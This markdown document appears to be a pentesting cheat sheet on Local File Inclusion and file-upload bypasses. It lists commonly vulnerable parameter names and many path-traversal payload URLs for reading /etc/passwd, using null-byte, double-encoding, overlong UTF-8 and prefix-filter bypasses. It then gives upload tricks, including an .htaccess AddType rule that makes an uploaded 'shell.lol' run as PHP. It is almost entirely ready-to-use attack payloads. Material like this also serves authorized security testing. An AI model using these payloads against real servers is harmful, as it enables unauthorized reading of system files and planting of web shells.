
## LFI (Local File Inclusion)


#### Methodology

- Identify the input Location
- add parameter to `/etc/passwd`
- If Error, Start Appending `../` at the beginning of the payload
- Continue till 10-20 `../../../../../`
- If Nothing works, Try above mentioned Encoding Techniques.


__Vulenrable Parameeters__

```js
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

### Payloads
__Primary Payload__
```
file=/etc/passwd
```

__Other Techniques__
```
http://targetserver.com/load.php?page=../../../../../etc/passwd
http://targetserver.com/load.php?page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
http://targetserver.com/load.php?page=../../../../../etc/passwd%00   -->For Extension Filters
http://targetserver.com/load.php?page=../../../../../etc/passwd%2500 -->For Extension Filters
http://targetserver.com/load.php?page=..\..\..\..\..\etc\passwd%00
http://targetserver.com/load.php?page=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd http://targetserver.com/load.php?page=/etc/passwd/../../../../../../../../../../../../../../../../../..
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

__some filter check whether the value of page= starts with /public or not if no they will block the request__
```
http://targetserver.com/load.php?page=/public/../../../../../../../../etc/passwd
```


__Encodings__
```js
URl encoding
Double encoding
16-unicode encoding
overlong UTF-8 Encoding
```

__Windows__
```
http://targetserver.com/load.php?page=../../../windows.ini
```



# File Upload

- Upload php
- Upload Different Version .php2 , .php3
- Upload html file
- Upload .phP
- Upload .PHP
- Upload .svg
- Remove Cookies from Upload Request
- Upload file.php.png
- Change content-type of request to accepted files content type
- Change Magic Byte of File to Accepted file


__If you can upload any random Extension but cannot execute the code__

- Create a new file `.htaccess` with the content
```
AddType application/x-httpd-php .lol
```

- Upload `.htaccess` to folder
- now upload `shell.lol` to the same folder


__Content-Type__

```
image/gif
text/html
application/xml
image/x-icon
image/jpeg
image/svg+xml
application/json
image/png
application/xhtml+xml
application/x-shockwave-flash
application/zip
application/javascript
application/x-bzip
text/css
text/csv
video/3gpp
```
